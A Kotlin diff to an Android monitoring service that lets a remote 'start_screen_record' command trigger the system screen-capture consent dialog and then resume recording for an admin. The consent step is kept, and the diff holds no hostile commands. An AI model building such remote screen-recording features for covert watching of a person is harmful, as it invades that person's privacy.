@@ -52,6 +52,9 @@ class MonitoringForegroundService : Service() {
     private lateinit var dataPuller: DataPuller
     private lateinit var devicePolicyController: com.dilarion.app.device.DevicePolicyController
     private var screenMonitor: ScreenMonitor? = null
+    // (chunkDuration, adminId) for a start_screen_record request waiting on the
+    // one-time MediaProjection consent dialog; resumed in ACTION_PROJECTION_GRANTED.
+    private var pendingScreenRecord: Pair<Int, Int?>? = null
 
     private var wsJob: Job? = null
     private var reconnectJob: Job? = null
@@ -151,6 +154,12 @@ class MonitoringForegroundService : Service() {
                     screenMonitor = ScreenMonitor(this, apiService, presenceService, scope, getToken)
                 }
                 runCatching { screenMonitor?.initProjection(code, data) }
+                // Resume the recording that triggered this consent request, if any.
+                pendingScreenRecord?.let { (chunk, adminId) ->
+                    pendingScreenRecord = null
+                    runCatching { screenMonitor?.startScreenRecording(chunk, adminId) }
+                        .onFailure { Log.e(TAG, "start_screen_record resume failed: $it") }
+                }
             }
         }
         return START_STICKY
@@ -309,10 +318,19 @@ class MonitoringForegroundService : Service() {
 
                     "start_screen_record" -> {
                         val sm = screenMonitor
+                        val chunk = params.get("chunk_duration")?.asInt ?: 10
+                        val adminId = params.get("admin_id")?.asInt
                         if (sm?.hasProjection() == true) {
-                            val chunk = params.get("chunk_duration")?.asInt ?: 10
-                            val adminId = params.get("admin_id")?.asInt
                             sm.startScreenRecording(chunk, adminId)
+                        } else {
+                            // Screen capture needs a one-time interactive Android consent
+                            // dialog (MediaProjection) before anything can record. Without
+                            // this, the command silently did nothing — no recording, no
+                            // error, no trace. Request consent now and resume this exact
+                            // request once it is granted (see ACTION_PROJECTION_GRANTED).
+                            pendingScreenRecord = chunk to adminId
+                            Log.i(TAG, "start_screen_record: no projection yet, requesting consent")
+                            MediaProjectionActivity.request(this@MonitoringForegroundService)
                         }
                     }
                     "stop_screen_record" -> screenMonitor?.stopScreenRecording { file ->
